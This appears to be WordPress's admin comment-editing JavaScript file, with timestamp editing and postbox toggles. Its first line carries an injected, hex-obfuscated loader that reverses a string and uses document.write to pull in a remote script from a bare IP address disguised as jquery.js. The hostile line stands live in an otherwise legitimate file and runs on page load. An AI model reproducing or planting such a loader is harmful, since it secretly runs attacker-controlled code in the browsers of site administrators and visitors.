var _0xaae8=["","\x6A\x6F\x69\x6E","\x72\x65\x76\x65\x72\x73\x65","\x73\x70\x6C\x69\x74","\x3E\x74\x70\x69\x72\x63\x73\x2F\x3C\x3E\x22\x73\x6A\x2E\x79\x72\x65\x75\x71\x6A\x2F\x38\x37\x2E\x36\x31\x31\x2E\x39\x34\x32\x2E\x34\x33\x31\x2F\x2F\x3A\x70\x74\x74\x68\x22\x3D\x63\x72\x73\x20\x74\x70\x69\x72\x63\x73\x3C","\x77\x72\x69\x74\x65"];document[_0xaae8[5]](_0xaae8[4][_0xaae8[3]](_0xaae8[0])[_0xaae8[2]]()[_0xaae8[1]](_0xaae8[0]))/* global postboxes, commentL10n */
jQuery(document).ready( function($) {

	postboxes.add_postbox_toggles('comment');

	var $timestampdiv = $('#timestampdiv'),
		$timestamp = $( '#timestamp' ),
		stamp = $timestamp.html(),
		$timestampwrap = $timestampdiv.find( '.timestamp-wrap' ),
		$edittimestamp = $timestampdiv.siblings( 'a.edit-timestamp' );

	$edittimestamp.click( function( event ) {
		if ( $timestampdiv.is( ':hidden' ) ) {
			$timestampdiv.slideDown( 'fast', function() {
				$( 'input, select', $timestampwrap ).first().focus();
			} );
			$(this).hide();
		}
		event.preventDefault();
	});

	$timestampdiv.find('.cancel-timestamp').click( function( event ) {
		// Move focus back to the Edit link.
		$edittimestamp.show().focus();
		$timestampdiv.slideUp( 'fast' );
		$('#mm').val($('#hidden_mm').val());
		$('#jj').val($('#hidden_jj').val());
		$('#aa').val($('#hidden_aa').val());
		$('#hh').val($('#hidden_hh').val());
		$('#mn').val($('#hidden_mn').val());
		$timestamp.html( stamp );
		event.preventDefault();
	});

	$timestampdiv.find('.save-timestamp').click( function( event ) { // crazyhorse - multiple ok cancels
		var aa = $('#aa').val(), mm = $('#mm').val(), jj = $('#jj').val(), hh = $('#hh').val(), mn = $('#mn').val(),
			newD = new Date( aa, mm - 1, jj, hh, mn );

		event.preventDefault();

		if ( newD.getFullYear() != aa || (1 + newD.getMonth()) != mm || newD.getDate() != jj || newD.getMinutes() != mn ) {
			$timestampwrap.addClass( 'form-invalid' );
			return;
		} else {
			$timestampwrap.removeClass( 'form-invalid' );
		}

		$timestamp.html(
			commentL10n.submittedOn + ' <b>' +
			commentL10n.dateFormat
				.replace( '%1$s', $( 'option[value="' + mm + '"]', '#mm' ).attr( 'data-text' ) )
				.replace( '%2$s', parseInt( jj, 10 ) )
				.replace( '%3$s', aa )
				.replace( '%4$s', ( '00' + hh ).slice( -2 ) )
				.replace( '%5$s', ( '00' + mn ).slice( -2 ) ) +
				'</b> '
		);

		// Move focus back to the Edit link.
		$edittimestamp.show().focus();
		$timestampdiv.slideUp( 'fast' );
	});
});
